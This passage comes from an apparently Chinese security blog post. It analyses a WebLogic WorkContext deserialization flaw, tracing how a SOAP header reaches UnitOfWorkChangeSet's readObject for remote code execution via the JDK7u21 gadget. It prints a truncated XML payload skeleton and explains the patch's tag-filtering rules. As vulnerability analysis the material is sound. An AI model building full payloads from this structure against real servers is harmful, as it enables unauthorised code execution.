dispatch方法中获取处理链（HandlerIterator），然后调用handleRequest方法处理请求：

![1686579233_648728210d8e7b1d5118f.png!small?1686579231387](https://image.3001.net/images/20230612/1686579233_648728210d8e7b1d5118f.png!small?1686579231387)

循环每个handler，调用他们的handleRequest方法，总共有21个handler：

![1686579237_648728257699e9fe493dc.png!small?1686579235828](https://image.3001.net/images/20230612/1686579237_648728257699e9fe493dc.png!small?1686579235828)

在WorkAreaServerHandler的handleRequest方法中：

![1686579244_6487282ca878b94e252be.png!small?1686579242865](https://image.3001.net/images/20230612/1686579244_6487282ca878b94e252be.png!small?1686579242865)

获取的header为：

![1686579248_6487283023fa81b3ad663.png!small?1686579246205](https://image.3001.net/images/20230612/1686579248_6487283023fa81b3ad663.png!small?1686579246205)

然后获取header的输入流，也就是Content的内容，然后包装成WorkContextXmlInputAdapter对象，传递给WorkContextMapImpl的receiveRequest方法，这里后续就跟CVE-2017-10271相同了。

![1686579252_6487283471676bb5288cb.png!small?1686579250535](https://image.3001.net/images/20230612/1686579252_6487283471676bb5288cb.png!small?1686579250535)

![1686579256_64872838eb0ce002c3e85.png!small?1686579255271](https://image.3001.net/images/20230612/1686579256_64872838eb0ce002c3e85.png!small?1686579255271)

![1686579261_6487283d6d0379949303b.png!small?1686579259475](https://image.3001.net/images/20230612/1686579261_6487283d6d0379949303b.png!small?1686579259475)

![1686579265_648728419d2335acb38db.png!small?1686579263721](https://image.3001.net/images/20230612/1686579265_648728419d2335acb38db.png!small?1686579263721)

  

回顾一下XML内容：

    
    
    <?xml version="1.0" encoding="utf-8"?>  
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
    <soapenv:Header>  
      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
          <java>  
              <class>  
                  <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet  
                  </string>  
                  <void>  
                      <array class="byte" length="8970">  
                      <void index="0">  
                          <byte>-84</byte>  
                      ...  
                      ...  
                      </array>  
    </void>  
    </class>  
          </java>  
      </work:WorkContext>  
    </soapenv:Header>  
    <soapenv:Body/>  
    </soapenv:Envelope>

将字节数组传递给UnitOfWorkChangeSet的构造函数进行实例化。

![1686579273_648728493cd972c16b2c0.png!small?1686579271396](https://image.3001.net/images/20230612/1686579273_648728493cd972c16b2c0.png!small?1686579271396)

先将字节数组包装成字节输入流，然后将该输入流作为对象输入流要读取的目标，然后readObjcet读取。造成反序列化漏洞，且未作任何过滤。配合JDK7u21造成RCE。

### 修复

打上p29633448_121300_Generic.zip补丁后，WorkContextXmlInputAdapter的validate方法如下：

![1686579276_6487284ca1c0991922362.png!small?1686579275315](https://image.3001.net/images/20230612/1686579276_6487284ca1c0991922362.png!small?1686579275315)

若标签名为object、class、new、method则抛出异常，同时标签名为void，但是标签带有的属性只要不是index就抛出异常，再往下看：

![1686579280_6487285093e8b9cc64e44.png!small?1686579278869](https://image.3001.net/images/20230612/1686579280_6487285093e8b9cc64e44.png!small?1686579278869)

若是array标签，则他的class属性的值不是byte就抛异常，然后限定他array标签的length小于10000，否则抛异常。

这里将class标签封禁，则payload就无法使用。

### 还有下集哦~

不想看分集想看完整的版的在我的blog：https://windowsdefender.com.cn/2023/06/09/WebLogic/

